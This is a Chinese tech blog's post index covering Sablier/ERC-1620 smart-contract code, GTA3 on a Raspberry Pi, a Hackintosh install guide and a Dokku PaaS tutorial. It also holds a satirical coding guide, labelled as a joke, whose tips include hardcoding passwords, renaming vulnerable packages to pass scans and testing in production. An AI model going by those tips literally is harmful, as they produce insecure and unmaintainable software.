require(balanceOf[_from] &gt;= _value);                // Check if the targeted balance is enough        require(_value &lt;= allowance[_from][msg.sender]);    // Check allowance        balanceOf[_from] -= _value;                         // Subtract from the targeted balance        allowance[_from][msg.sender] -= _value;             // Subtract from the sender&#x27;s allowance        totalSupply -= _value;                              // Update totalSupply        emit Burn(_from, _value);        return true;    &#125;&#125;\n\n只要将上述的智能合约发布到以太坊上，与该智能合约做交易，即可完成代币的发行、金额分配。\nERC 1620铺垫了那么多，其实ERC 1620 也是一种Token代币协议，是对ERC 20的封装与改进，为其加入了流式协议。\n在流式协议中，对每一个流式付款的开始、停止、提现，都有记录。\n前端根据对应的事件记录，做出UI上的响应。\npragma solidity 0.5.11;/** * @title ERC-1620 Money Streaming Standard * @author Sablier * @dev See https://eips.ethereum.org/EIPS/eip-1620 */interface IERC1620 &#123;    /**     * @notice Emits when a stream is successfully created.     */    event CreateStream(        uint256 indexed streamId,        address indexed sender,        address indexed recipient,        uint256 deposit,        address tokenAddress,        uint256 startTime,        uint256 stopTime    );    /**     * @notice Emits when the recipient of a stream withdraws a portion or all their pro rata share of the stream.     */    event WithdrawFromStream(uint256 indexed streamId, address indexed recipient, uint256 amount);    /**     * @notice Emits when a stream is successfully cancelled and tokens are transferred back on a pro rata basis.     */    event CancelStream(        uint256 indexed streamId,        address indexed sender,        address indexed recipient,        uint256 senderBalance,        uint256 recipientBalance    );    function balanceOf(uint256 streamId, address who) external view returns (uint256 balance);    function getStream(uint256 streamId)        external        view        returns (            address sender,            address recipient,            uint256 deposit,            address token,            uint256 startTime,            uint256 stopTime,            uint256 remainingBalance,            uint256 ratePerSecond        );    function createStream(address recipient, uint256 deposit, address tokenAddress, uint256 startTime, uint256 stopTime)        external        returns (uint256 streamId);    function withdrawFromStream(uint256 streamId, uint256 funds) external returns (bool);    function cancelStream(uint256 streamId) external returns (bool);&#125;\n\nSablier 关键源码本质上来说，Sablier是对ERC 1620的实现，仔细阅读代码，不难看出流式付款，不是每秒做交易，只是在关键的时间节点，打上对应的事件记录，中间看似 秒薪，实际上是web上的显示动画，只有“提现withdraw”才会真正的触发交易。\n当然，这个动画值得信任，毕竟起始点和终止点都有记录，在任何一个计算机上展示的动画，都应该是一样的，谁也无法篡改中间的值。\n/**  * @notice Creates a new stream funded by `msg.sender` and paid towards `recipient`.  * @dev Throws if paused.  *  Throws if the recipient is the zero address, the contract itself or the caller.  *  Throws if the deposit is 0.  *  Throws if the start time is before `block.timestamp`.  *  Throws if the stop time is before the start time.  *  Throws if the duration calculation has a math error.  *  Throws if the deposit is smaller than the duration.  *  Throws if the deposit is not a multiple of the duration.  *  Throws if the rate calculation has a math error.  *  Throws if the next stream id calculation has a math error.  *  Throws if the contract is not allowed to transfer enough tokens.  *  Throws if there is a token transfer failure.  * @param recipient The address towards which the money is streamed.  * @param deposit The amount of money to be streamed.  * @param tokenAddress The ERC20 token to use as streaming currency.  * @param startTime The unix timestamp for when the stream starts.  * @param stopTime The unix timestamp for when the stream stops.  * @return The uint256 id of the newly created stream.  */ function createStream(address recipient, uint256 deposit, address tokenAddress, uint256 startTime, uint256 stopTime)     public     whenNotPaused     returns (uint256) &#123;     require(recipient != address(0x00), &quot;stream to the zero address&quot;);     require(recipient != address(this), &quot;stream to the contract itself&quot;);     require(recipient != msg.sender, &quot;stream to the caller&quot;);     require(deposit &gt; 0, &quot;deposit is zero&quot;);     require(startTime &gt;= block.timestamp, &quot;start time before block.timestamp&quot;);     require(stopTime &gt; startTime, &quot;stop time before the start time&quot;);     CreateStreamLocalVars memory vars;     (vars.mathErr, vars.duration) = subUInt(stopTime, startTime);     /* `subUInt` can only return MathError.INTEGER_UNDERFLOW but we know `stopTime` is higher than `startTime`. */     assert(vars.mathErr == MathError.NO_ERROR);     /* Without this, the rate per second would be zero. */     require(deposit &gt;= vars.duration, &quot;deposit smaller than time delta&quot;);     /* This condition avoids dealing with remainders */     require(deposit % vars.duration == 0, &quot;deposit not multiple of time delta&quot;);     (vars.mathErr, vars.ratePerSecond) = divUInt(deposit, vars.duration);     /* `divUInt` can only return MathError.DIVISION_BY_ZERO but we know `duration` is not zero. */     assert(vars.mathErr == MathError.NO_ERROR);     /* Create and store the stream object. */     uint256 streamId = nextStreamId;     streams[streamId] = Types.Stream(&#123;         remainingBalance: deposit,         deposit: deposit,         isEntity: true,         ratePerSecond: vars.ratePerSecond,         recipient: recipient,         sender: msg.sender,         startTime: startTime,         stopTime: stopTime,         tokenAddress: tokenAddress     &#125;);     /* Increment the next stream id. */     (vars.mathErr, nextStreamId) = addUInt(nextStreamId, uint256(1));     require(vars.mathErr == MathError.NO_ERROR, &quot;next stream id calculation error&quot;);     require(IERC20(tokenAddress).transferFrom(msg.sender, address(this), deposit), &quot;token transfer failure&quot;);     emit CreateStream(streamId, msg.sender, recipient, deposit, tokenAddress, startTime, stopTime);     return streamId; &#125; struct CreateCompoundingStreamLocalVars &#123;     MathError mathErr;     uint256 shareSum;     uint256 underlyingBalance;     uint256 senderShareMantissa;     uint256 recipientShareMantissa; &#125;\n\n如下是计算当前流式付款单id的账户余额的方法。\n/**    * @notice Returns the available funds for the given stream id and address.    * @dev Throws if the id does not point to a valid stream.    * @param streamId The id of the stream for which to query the balance.    * @param who The address for which to query the balance.    * @return The total funds allocated to `who` as uint256.    */   function balanceOf(uint256 streamId, address who) public view streamExists(streamId) returns (uint256 balance) &#123;       Types.Stream memory stream = streams[streamId];       BalanceOfLocalVars memory vars;       uint256 delta = deltaOf(streamId);       (vars.mathErr, vars.recipientBalance) = mulUInt(delta, stream.ratePerSecond);       require(vars.mathErr == MathError.NO_ERROR, &quot;recipient balance calculation error&quot;);       /*        * If the stream `balance` does not equal `deposit`, it means there have been withdrawals.        * We have to subtract the total amount withdrawn from the amount of money that has been        * streamed until now.        */       if (stream.deposit &gt; stream.remainingBalance) &#123;           (vars.mathErr, vars.withdrawalAmount) = subUInt(stream.deposit, stream.remainingBalance);           assert(vars.mathErr == MathError.NO_ERROR);           (vars.mathErr, vars.recipientBalance) = subUInt(vars.recipientBalance, vars.withdrawalAmount);           /* `withdrawalAmount` cannot and should not be bigger than `recipientBalance`. */           assert(vars.mathErr == MathError.NO_ERROR);       &#125;       if (who == stream.recipient) return vars.recipientBalance;       if (who == stream.sender) &#123;           (vars.mathErr, vars.senderBalance) = subUInt(stream.remainingBalance, vars.recipientBalance);           /* `recipientBalance` cannot and should not be bigger than `remainingBalance`. */           assert(vars.mathErr == MathError.NO_ERROR);           return vars.senderBalance;       &#125;       return 0;   &#125;\n\n不难看出，流式付款协议的事件计算方法，因为以太坊默认没有系统时间函数，是以区块时间戳为关键计算变量的。\n/**  * @notice Returns either the delta in seconds between `block.timestamp` and `startTime` or  *  between `stopTime` and `startTime, whichever is smaller. If `block.timestamp` is before  *  `startTime`, it returns 0.  * @dev Throws if the id does not point to a valid stream.  * @param streamId The id of the stream for which to query the delta.  * @return The time delta in seconds.  */ function deltaOf(uint256 streamId) public view streamExists(streamId) returns (uint256 delta) &#123;     Types.Stream memory stream = streams[streamId];     if (block.timestamp &lt;= stream.startTime) return 0;     if (block.timestamp &lt; stream.stopTime) return block.timestamp - stream.startTime;     return stream.stopTime - stream.startTime; &#125;\n\n如下是取现的实现方式，本质上是调用了ERC20上的transfer方法，把流式协议中对应的金额提取到对应收款人账户下，取现需收款人主动触发交易。\n/**   * @notice Makes the withdrawal to the recipient of the stream.   * @dev If the stream balance has been depleted to 0, the stream object is deleted   *  to save gas and optimise contract storage.   *  Throws if the stream balance calculation has a math error.   *  Throws if there is a token transfer failure.   */  function withdrawFromStreamInternal(uint256 streamId, uint256 amount) internal &#123;      Types.Stream memory stream = streams[streamId];      WithdrawFromStreamInternalLocalVars memory vars;      (vars.mathErr, streams[streamId].remainingBalance) = subUInt(stream.remainingBalance, amount);      /**       * `subUInt` can only return MathError.INTEGER_UNDERFLOW but we know that `remainingBalance` is at least       * as big as `amount`. See the `require` check in `withdrawFromInternal`.       */      assert(vars.mathErr == MathError.NO_ERROR);      if (streams[streamId].remainingBalance == 0) delete streams[streamId];      require(IERC20(stream.tokenAddress).transfer(stream.recipient, amount), &quot;token transfer failure&quot;);      emit WithdrawFromStream(streamId, stream.recipient, amount);  &#125;\n\n如下是Sablier上的Events记录，真实的例子。\n\n总结Sablier给我们带来了一种全新的理念，付款可以达到流式效果，分析源码，不难得出，实际上在区块链的交易上，并没有每一秒都触发一次transfer转账交易，而是在流式付款协议创建、结束、提现的时候，记录了关键的时间节点，其实，只有提现的时间，才是真正完成转账的时间。\n值得注意的是，每一次提现都会带来交易手续费，这恐怕是无法避免的缺点，ERC1620标准将这种缺点降低到了最低，使用“虚假的前端展示”的流式转账，既保障了“流式”，又保障了尽可能少的手续费，也保障了交易的真实性。\n","categories":["Defi"],"tags":["Defi"]},{"title":"在树莓派上编译运行GTA3","url":"http://www.yfgeek.com/2020/09/28/在树莓派上编译运行GTA3/","content":"最近观闻《GTA3迟迟不推出Switch版本，于是玩家自己动手搞定了》，看了一下项目工程，支持Linux、Mac、Windows，想到，何不动手在树莓派上试一试？\n运行环境系统：在Raspberry Pi OS 32位、64位均可运行，Ubuntu Core+Mate桌面尝试失败；\nGPU：需关闭OpenGL的Fake模式\n设备：Raspberry Pi 4\n编译开源项目：https://github.com/rwengine/openrw\n准备编译工具在命令行中，安装必备工具\nsudo apt install libbullet-dev libsdl2-dev libavcodec-dev libavformat-dev libglm-dev libopenal-dev libboost-dev libboost-filesystem-dev libboost-system-dev libboost-program-options-dev cmake -y\n\n下载OpenRWcd ~git clone --recursive https://github.com/rwengine/openrw.git openrw\n\n编译mkdir buildcd buildcmake .. -DCMAKE_BUILD_TYPE=Releasecmake --build .\n\n拷贝GTA3 资源文件下载原生的GTA3，找到包路径，完全复制到树莓派里\n配置mkdir ~/.config/OpenRWcd ~/.config/OpenRWvim openrw.ini\n\n添加如下配置内容\n[game]; exe的文件路径path=/opt/games/Grand Theft Auto 3/; 游戏语言，只可选american, french, german, italian 和 spanishlanguage=american[input]; Invert mouse-look camera Yinvert_y=0[window]; Size of the windowwidth=800height=600; Start in fullscreenfullscreen=0\n\n运行在桌面环境中，进入目录~/openrw/build/rwgame\n运行编译后的文件 ./rwgame\n美中不足的是，我尝试用raspi-config打开OpenGL，却提示GLXBadFBConfig。\n目测1FPS-2FPS，实验意义大于实际意义。\n\n视频围观：https://www.bilibili.com/video/BV16K4y187o3/\n","categories":["RaspberryPi"],"tags":["RaspberryPi"]},{"title":"程序员生存指南之如何加固你的项目","url":"http://www.yfgeek.com/2020/09/10/程序员生存指南之如何加固你的项目/","content":"本文披露了一些生存秘诀，如何尽一切可能保住自己的饭碗，乃生存之道，建议惠存之。\n架构\n充分利用微服务：微服务的思想，将服务细颗粒度拆分，是本世纪最伟大的发明之一，解决了多个程序员的吃饭问题。将服务拆的越细越好，引入多种内部微服务调用方式，拒绝考虑事物一致性问题，拒绝设计失败重试、限流限次功能；\n不要把鸡蛋放到一个篮子里：引入Ruby、Rust这种小众语言，结合微服务异构你的项目，市场人才缺失，解决人员可持续性问题；\n分而治之：分布式的强大，在于创造了很多工作岗位，通信协议、一致性、流量调度、服务调度、容错机制…而且饭碗数量还会随着项目的变大而增多，非常不错；\n假装进行表设计：不需要考虑第几范式的问题，什么是规矩，我就是规矩，随意设计，实现功能即可；\n\n编码\n学会撒谎：学会本生存指南的第一要义，就是要学会撒谎，以便留下好的名声。优秀的代码是要发扬匿名者精神的，正所谓功成不必在我。代码中的作者，能复用前作者，就用前作者，能用他人的名字就用他人的名字；\n小题大做：把每一种正常逻辑，都当作特殊情况。使用策略模式代替简单的switch代码；\n膨胀代码：扩张每一个实现类的代码，确切的说，你不用刻意这么做，不删除在Stackoverflow、CSDN上复制过来的多余的代码就好了；\n逆向思维：正向思考问题不能锻炼智商，使用逆向思维优化你的代码。试图优化所有if逻辑，将逻辑反向为“逆否”逻辑，你的代码，没你不行；\n覆盖测试：没错，要以测试驱动思想TDD写你的代码，将代码覆盖到所有案例就够了。比如验证是否为偶数的代码，请不要用i mod 2实现，请参考测试案例，写为i == 0 || i == 2 || i == 4 || i == 6，切记，一定要保证测试正案例和反案例全部通过；\n量子理论：学会用量子思维治理你的系统，禁止使用常量、静态等概念。不存在任何常量，让一切都可变，方便引入更多的hacky思想；\n着眼当下：如果项目中存在缺陷，发现哪个，就修哪个。如果发现第5点中，无法判断8是否为偶数，直接在hotfix中添加i == 8即可，简单，快速，安全；\n表示本意：不要为函数名、变量起名而发愁，函数名、变量用其本意即可。如firstFunc goIntoMethod param1 param2 key value ，一次代码，到处复制，可以复制到不同的工程中无需更改代码；\n不断封装：将一个函数，不断封装，每一层级都有每一层级的作用，这样才能保证充分的利用；理论上一个函数如果有n个参数，最多可有n!个封装方式；\n鸭子模式：“当看到一只鸟走起来像鸭子、游泳起来像鸭子、叫起来也像鸭子，那么这只鸟就可以被称为鸭子。”，没错，进行后端设计的时候，无需关注表名、字段名、接口名，只实现功能即可；\n业务为王：遇到产品经理跟你说，需求又要变的时候，切记，这是一件好事。不需要多余的思考，就按照需求增加功能，架构？设计模式？不，不需要动，以需求为准，一切随着业务而动；\n充分设计：在第一次设计项目时，尽可能的把未来要遇到的所有情况的子情况都考虑在内，一定要把所有的情况都定义到代码中，即使它目前来讲没有任何用途，甚至永远不会走到这个逻辑；\n\n版本\n不要真的使用版本控制软件：版本控制是用来提交代码的，要学会使用文件夹进行版本管理，如 xxx-center-20200525-第一次修改版， xxx-center-20200525-最终版， xxx-center-20200525-最终不改版1，xxx-center-20200525-最终不改版2，xxx-center-20200525-最终不改版2.zip；\n假装使用CI/CD：如果CI过程中，单元测试不通过，可以把单元测试删掉，持续集成出来的包可以不用，最终投产替换本地生产包进行迷惑；\n善用配置文件：将配置文件放置于多个目录不同层级进行迷惑，以springboot工程为例，将配置文件分别在项目内部、项目外部.\\,.\\config\\放置各一份，内容各不相同，只有掌握springboot加载优先级的优秀工程师才能区分清楚，便于筛选人才，如有备份的配置文件，甚至可放在同一目录进行迷惑；\n拒绝清理脏数据：因需求变更或者bug造成的脏数据，只要没有被发现，即可不用清理；\n生产才是测试环境：牢牢把握这个原则，更多的问题，找真实的客户在生产测试，才会更全面；\n\n文档\n写技术文档是无用的工作：请不要遗留下任何文档，工作交接可以选择远程口述；\n\n安全\n学会表面上的安全：如果安全检查出开源组件出现威胁，可以自己修改开源组件的包名和版本号即可解决；如果安全检查出密码明文配置文件保存，可以通过密码写死在代码里、把配置文件打包在jar包里等多种方式即可解决；\n搭建属于自己的蜜罐：升级后备份的之前的系统，不要下线，直接换端口号启动；不同机器网络隔离，使用多个nginx互相中转流量，建议使用20个以上nginx，只有迷惑自己，才能迷惑敌人；\n坚持使用优秀开源框架：如struts2、fastjson、thinkphp等，开发人员和安全人员身处同一艘船，合作共赢才能更加持久的保住饭碗；\n\n简而言之就一句话：你就正常写代码上版本就行\n","categories":["笑话"],"tags":["笑话"]},{"title":"NUC5i5RYH Mojave 黑苹果安装教程","url":"http://www.yfgeek.com/2019/05/18/NUC5i5RYH-Mojave-黑苹果安装手记/","content":"\n本文内容仅供学习，需要十分清楚的是黑苹果其实是一个具有潜在盗版性质的行为，因为它违反了苹果公司的 EULA 法案(EULA)。 所以本教程只是以安装黑苹果为一个引线，进而介绍和分享关于苹果操作系统的相关知识和系统的一些安装方法，不参与任何商业活动，也不允许任何人使用本文章搜集和创作的资料参与任何商业活动。如果你想要开始黑苹果技术，我们希望你是抱着一个极客的心态来的，并且将这些技术应用到其他相关领域的学习和工作中去。\n\n五年前装过几个黑苹果，不过当时使用的是变色龙，现在年代久远，重拾黑苹果，用Clover，发现比原来走的路，简单得多，分享一二。\n其实网上已有踩过坑的黑苹果，按照采坑记录走，应该问题就不大。不过，我的全部步骤和已有教程不是特别一致。下面对我的过程进行介绍。\n本人全部过程参考以下教程，为减少您的坑，我已经把我调教好的配置文件和驱动上传至GitHub。\n效果图\n\nDisplay Port 完美 (4K)\n\nHDMI 完美\n\n音频输出 完美\n\n睿频 完美\n\n休眠 完美\n\nUSB3.0 完美\n\nWIFi 无解 (可购买BCM94352Z解决问题)\n\n蓝牙 无解 (可购买BCM94352Z解决问题)\n\n\n材料\n至少8GB U盘一枚\nmacOS Mojave 10.14(18A389) Installer 镜像\n本机硬盘 GPT分区 至少预留一个空分区 如果全盘安装，请将硬盘清空\nTransMac(dmg文件打开工具)\nDiskGenius\n一个winpe盘(用于处理紧急情况，可选，也可以使用备用电脑)\n为您调教的NUC5i5RYH专用配置文件\n\n准备安装U盘确保上述到位后，使用TransMac打开下载好的dmg文件。具体操作步骤如下：\n\n把 U 盘插入电脑，然后再打开之前安装好的 TransMac 软件，找到窗口左侧中出现的U盘；\n将 U 盘格式为 Mac 系统下的磁盘格式，选中 U 盘并右键选择“Format Disk for Mac”选项，保持默认的 Mac OS Extended HFS+ 即可；\n随后软件会提示我们是否要将此 U 盘格式为 Mac 磁盘格式，点击 OK 按钮继续。接着请等待软件将 U 盘格式为 Mac 磁盘格式；\n当 U 盘被格式化完成以后，选中 U 盘并点击右键选择“Restore with Disk image”选项，选择了一个 Mac OS的Mac系统镜像；\n此时软件会提示我们 U 盘上数据将会被清除，点击“Yes”按钮继续。等待软件将 Mac 系统的镜像恢复到 U 盘里。\n当出现“Restore Complete”的时候就代表MacOS的U盘启动盘制作完成了。\n\n\n刻录好后，别急，使用DiskGenuis打开U盘刻录好的EFI分区，打开为您调教的NUC5i5RYH专用配置文件，将Installtion目录下的目录替换EFI分区内的目录。\n大功告成，重启。\n进入安装阶段 开机，F2进入BIOS，设置如下\n\nDevices-&gt;Onboard Devices-&gt;Legacy Device Configuration,  “Serial Port”  设置为 disabled\n\nBoot-&gt;Boot Configuration,  “Network Boot” 设置为 disabled\n\nPower-&gt;Secondary Power Settings, “Wake on LAN from S4/S5”, 设置为 “Stay Off”\n\nDevices-&gt;USB, “xHCI Mode” 设置为 “Smart Auto”\n\nDevices-&gt;Video, “IGD Minimum Memory” 设置为 64mb\n\nDevices-&gt;Video, “IGD Aperture Size” 设置为 256mb\n\nBoot-&gt;Secure Boot, “Secure Boot” 设置为 disabled\n\nSecurity-&gt;Security Features, “Execute Disable Bit” 设置为 enabled\n\n\n开机，按选择U盘启动，进入Clover界面，选择优盘启动。\n稍等片刻，即可进入安装界面。\n\n\n选择磁盘工具，选择要安装的磁盘，将其格式化为APFS文件系统。\n随后的事情就很简单了，顺序安装软件即可。\n\n\n第一次重启进度条走完后，会自动重启，此时非常重要，重启后一定要选择Boot macOS install Prebooter from Preboot\n\n\n第二次重启重启后选择Boot macOS from 硬盘名，本次重启会像安装iOS一样，走黑苹果下的进度条，走完即可。耐心等待。\n进入桌面不出意外的话，就能进入正常的macOS第一次安装后的桌面，进入常规设置后。请安装Clover Configurator，装好后，加载EFI分区。\n\n打开之前为您调教的NUC5i5RYH专用配置文件，将Post Installtion目录下的目录替换加载好的EFI分区内的目录。\n重启，大功告成！\n为什么这么简单因为我帮你整理了所有复杂的过程，驱动文件、配置文件，帮你把所有坑都躺过了而已，其实安装黑苹果并不简单，其中大大小小重新装了四次，无数次报错，各种棘手的问题。\n如果本文不成功，请参考以下文章：\nhttps://www.tonymacx86.com/threads/guide-intel-broadwell-nuc5-using-clover-uefi-nuc5i5mhye-nuc5i3myhe-etc.261712/\n黑苹果是有趣的，其实整个过程更加有趣，如同游戏闯关一样，遇到一个困难，一个又一个，最后都能解决。如果想享受乐趣，不要参考本文，请参考上述文章，enjoy如图的乐趣。\n\n","categories":["Mac"],"tags":["Mac"]},{"title":"利用Dokku搭建自己的PaaS云服务器","url":"http://www.yfgeek.com/2018/10/10/利用Dokku搭建自己的PaaS云服务器/","content":"自从几年前用过各种云平台的部署方式（App Engine，云应用引擎），就感觉再也回不去了。每次用到传统的部署方式，都感觉这是上个世纪的感觉，可是痛点就在于，不管是阿里云、百度云、腾讯云，各种云平台的云应用引擎，早就开始逐渐的由免费转向收费，虽然价格不高，但是总感觉受制于人， 而且不同平台不同标准，各种平台的云服务让你越来越上瘾。\n很早听@WildCat大佬说过，可以自己搭建自己的PaaS平台（支持Java、Python、Ruby、PHP、Node、Go等），由于之前手上的服务器空间有限，一直没有试过，利用闲暇时间，买了台新的服务器，动手尝试了一下，果然不错。\n\n先简单说一下App Engine，各种App Engine最大的优点就是部署方便成本低，做为开发者，不需要管运行环境如何，只需要写好相关的配置文件，用git的方式，将代码上传到服务器上，服务器将代码放在docker容器内运行，服务器实现自动化部署。\n至于配置安装过程很简单，按照官网英文文档，一步一步来，问题不大，下面描述一下过程。\n环境官网中要求，要安装dokku，需要：\n\n全新安装的Ubuntu 16.04 x64, Ubuntu 14.04 x64, Debian 8.2 x64 or CentOS 7 x64 (不建议)\n至少1GB内存 （如果不足，官网也给出了解决方法）\n\n之前尝试使用过Ubuntu18版本安装，安装未遂，后来老老实实的走官网的版本要求，一次性成功。\n我是Centos的死粉，但是官网中声明，如果使用centos系统，将无法使用网页配置（可以使用cli进行配置）。\n我的安装环境：Ubuntu 16.04 x64，内存1GB。\n安装wget https://raw.githubusercontent.com/dokku/dokku/v0.12.13/bootstrap.sh;sudo DOKKU_TAG=v0.12.13 bash bootstrap.sh\n\n在服务器上执行上述两句，服务器会用bash脚本自动安装，速度有点慢，如果没有任何报错，就操作完成了。\n设置主域名&amp;子域名dokku支持子域名解析，这很帅气，我们可以用泛解析的方式，将IP都指向一个域名下。\n举个例子，如果有个web 1，命名为web1，我们可以在git push程序后，自动部署并解析到你的域名下\nweb1.xxx.com，这种思路很适合做小的prototype或者demo。当然，如果你想设置单独的域名，我们可以使用dokku domains命令进行设置，参考。\n设置DNS解析进入你的域名DNS管理网站，如阿里云、腾讯云、dnspod、cloudflare。本文以cloudflare为例。\n添加A记录，Name 填写 *.lab IP 地址填写为你的服务器地址。\n添加A记录，Name 填写 lab IP 地址填写为你的服务器地址。\n进入Dokku Web配置页面设置浏览器打开服务器IP地址，端口80，第一次配置会进入配置页面。\nPublic Key填写为你要上传git的时提交的公钥，位置~\\.ssh\\id_rsa.pub，如果没有，就用ssh-keygen生成一个并且放到~\\.ssh目录下即可。\n在配置页面中Hostname填写为服务器主地址，我的填写为 lab.yfgeek.com\n同时勾选Use virtualhost naming for apps，允许使用子域名。\n点击完成安装，就完成配置了。\n部署前准备语言支持实际上，dokku是heroku的最小化版本，他们之间的例子是互通的，因此可以访问：\nhttps://github.com/heroku\n官方给了很多例子，搜搜demo或者对应语言，如java，找到相应的例子\nnode: node-js-sample\nruby:ruby-sample\nrails:ruby-sample\njava:ruby-rails-sample\npython:java-sample\nspring:java-spring-sample\ndjango:python-django-sample\nscala:scala-sample\nphp:php-getting-started\nphp:facebook-template-php\ngo-kafaka:heroku-kafka-demo-go\n此外还有很多\n数据库支持根据官网写的支持的数据库，可以有以下列表，数据库以插件的形式安装。\n关系型数据库\n\n\nPlugin\nAuthor\nCompatibility\n\n\n\nMariaDB\nKloadut\n0.3.x\n\n\nMariaDB (single container)\nohardy\n0.3.x\n\n\nMariaDB (single container)\nkrisrang\n0.3.26+\n\n\nPostgreSQL\njlachowski\n0.3.x\n\n\nPostgreSQL (single container)\nohardy\n0.3.x\n\n\nPostgreSQL (single container)\nFlink\n0.3.26+\n\n\n缓存\n\n\nPlugin\nAuthor\nCompatibility\n\n\n\nNginx Cache\nAluxian\n0.5.0+\n\n\nRedis (single container)\nohardy\n0.3.x\n\n\nVarnish\nZenedith\nVarnish cache between nginx and application with base configuration\n\n\n队列\n\n\nPlugin\nAuthor\nCompatibility\n\n\n\nRabbitMQ\njlachowski\n0.3.x\n\n\nRabbitMQ (single container)\njlachowski\n0.3.x\n\n\nElasticMQ (SQS compatible)\ncu12\n0.5.0+\n\n\nVerneMQ (MQTT Broker)\nmrname\n0.4.0+\n\n\n其他\n\n\nPlugin\nAuthor\nCompatibility\n\n\n\netcd\nbasgys\n0.4.x\n\n\nFakeSNS\ncu12\n0.5.0+\n\n\nInfluxDB\nbasgys\n0.4.x\n\n\nRethinkDB\nstuartpb\n0.3.x\n\n\n部署第一个测试应用创建APP登录服务器，执行dokku apps:create [name]创建应用\ndokku apps:create ruby-rails-sample\n\n安装数据库插件本文以安装PostgreSQL为例\nsudo dokku plugin:install https://github.com/dokku/dokku-postgres.git\n\n创建应用的数据库dokku postgres:create rails-database\n\n关联数据库与APP通过在代码后端设置读取POSTGRES_URL环境变量，连接数据库。\n与此同时，我们需要将APP与数据库关联。\ndokku postgres:link rails-database ruby-rails-sample\n\n部署App下载Sample代码，后将代码传到服务器上\ngit clone git@github.com:heroku/ruby-rails-sample.gitgit remote add dokku dokku@lab.yfgeek.com:ruby-rails-samplegit push dokku master\n\n值得一提的是，用户名必须是dokku，否则会出现问题。\nCounting objects: 236, done.Delta compression using up to 4 threads.Compressing objects: 100% (135/135), done.Writing objects: 100% (236/236), 41.85 KiB | 10.46 MiB/s, done.Total 236 (delta 85), reused 236 (delta 85)-----&gt; Cleaning up...-----&gt; Building ruby-rails-sample from herokuish...-----&gt; Setting config vars       CURL_CONNECT_TIMEOUT:  90-----&gt; Setting config vars       CURL_TIMEOUT:  600-----&gt; Adding BUILD_ENV to build environment...-----&gt; Ruby app detected-----&gt; Compiling Ruby/Rails-----&gt; Using Ruby version: ruby-2.2.1-----&gt; Installing dependencies using bundler 1.15.2       Running: bundle install --without development:test --path vendor/bundle --binstubs vendor/bundle/bin -j4 --deployment       Fetching gem metadata from https://rubygems.org/..........       Fetching version metadata from https://rubygems.org/..       Fetching dependency metadata from https://rubygems.org/.       Using rake 10.4.2       Fetching i18n 0.7.0       Fetching json 1.8.2       Fetching minitest 5.5.1       Installing i18n 0.7.0       Installing minitest 5.5.1       Installing json 1.8.2 with native extensions       Fetching thread_safe 0.3.5       Installing thread_safe 0.3.5       Fetching builder 3.2.2       Installing builder 3.2.2       Fetching erubis 2.7.0       Fetching mini_portile 0.6.2       Installing mini_portile 0.6.2       Fetching rack 1.6.0       Installing erubis 2.7.0       Fetching mime-types 2.4.3       Installing mime-types 2.4.3       Fetching arel 6.0.0       Installing rack 1.6.0       Installing arel 6.0.0       Using bundler 1.15.2       Fetching coffee-script-source 1.9.1       Fetching execjs 2.5.2       Installing execjs 2.5.2       Installing coffee-script-source 1.9.1       Fetching thor 0.19.1       Fetching hike 1.2.3       Installing thor 0.19.1       Installing hike 1.2.3       Fetching multi_json 1.11.0       Installing multi_json 1.11.0       Fetching pg 0.18.1       Fetching tilt 1.4.1       Installing tilt 1.4.1       Fetching rails_serve_static_assets 0.0.4       Installing pg 0.18.1 with native extensions       Installing rails_serve_static_assets 0.0.4       Fetching rails_stdout_logging 0.0.3       Installing rails_stdout_logging 0.0.3       Using rdoc 4.2.0       Fetching sass 3.4.13       Installing sass 3.4.13       Fetching tzinfo 1.2.2       Installing tzinfo 1.2.2       Fetching nokogiri 1.6.6.2       Installing nokogiri 1.6.6.2 with native extensions       Fetching mail 2.6.3       Installing mail 2.6.3       Fetching rack-test 0.6.3       Installing rack-test 0.6.3       Fetching puma 2.11.1       Installing puma 2.11.1 with native extensions       Fetching coffee-script 2.4.1       Installing coffee-script 2.4.1       Fetching sprockets 2.12.3       Installing sprockets 2.12.3       Fetching rails_12factor 0.0.3       Installing rails_12factor 0.0.3       Fetching loofah 2.0.1       Installing loofah 2.0.1       Fetching rails-html-sanitizer 1.0.2       Installing rails-html-sanitizer 1.0.2       Fetching activesupport 4.2.1       Fetching sdoc 0.4.1       Fetching uglifier 2.7.1       Installing uglifier 2.7.1       Installing sdoc 0.4.1       Installing activesupport 4.2.1       Fetching rails-deprecated_sanitizer 1.0.3       Fetching globalid 0.3.5       Fetching activemodel 4.2.1       Installing rails-deprecated_sanitizer 1.0.3       Installing activemodel 4.2.1       Fetching jbuilder 2.2.12       Fetching rails-dom-testing 1.0.6       Installing globalid 0.3.5       Fetching activerecord 4.2.1       Installing jbuilder 2.2.12       Installing rails-dom-testing 1.0.6       Fetching activejob 4.2.1       Fetching actionview 4.2.1       Installing activejob 4.2.1       Installing actionview 4.2.1       Fetching actionpack 4.2.1       Installing activerecord 4.2.1       Installing actionpack 4.2.1       Fetching actionmailer 4.2.1       Fetching railties 4.2.1       Fetching sprockets-rails 2.2.4       Installing actionmailer 4.2.1       Installing sprockets-rails 2.2.4       Installing railties 4.2.1       Fetching coffee-rails 4.1.0       Fetching jquery-rails 4.0.3       Fetching rails 4.2.1       Installing coffee-rails 4.1.0       Fetching sass-rails 5.0.3       Installing jquery-rails 4.0.3       Fetching turbolinks 2.5.3       Installing sass-rails 5.0.3       Installing turbolinks 2.5.3       Installing rails 4.2.1       Bundle complete! 13 Gemfile dependencies, 53 gems now installed.       Gems in the groups development and test were not installed.       Bundled gems are installed into ./vendor/bundle.       Bundle completed (47.15s)       Cleaning up the bundler cache.       The latest bundler is 1.17.0.pre.1, but you are currently running 1.15.2.       To update, run `gem install bundler --pre`-----&gt; Installing node-v8.10.0-linux-x64-----&gt; Detecting rake tasks-----&gt; Preparing app for Rails asset pipeline       Running: rake assets:precompile       I, [2018-10-10T05:36:01.119423 #1214]  INFO -- : Writing /tmp/build/public/assets/application-47fe71a3b34a93e1929c175b1755d405.js       I, [2018-10-10T05:36:01.144742 #1214]  INFO -- : Writing /tmp/build/public/assets/application-c06dd6a542ea15147e6794e03643f87c.css       Asset precompilation completed (7.21s)       Cleaning assets       Running: rake assets:clean-----&gt; Detecting rails configuration-----&gt; Discovering process types       Procfile declares types -&gt; web-----&gt; Releasing ruby-rails-sample (dokku/ruby-rails-sample:latest)...-----&gt; Deploying ruby-rails-sample (dokku/ruby-rails-sample:latest)...-----&gt; Attempting to run scripts.dokku.predeploy from app.json (if defined)-----&gt; App Procfile file found 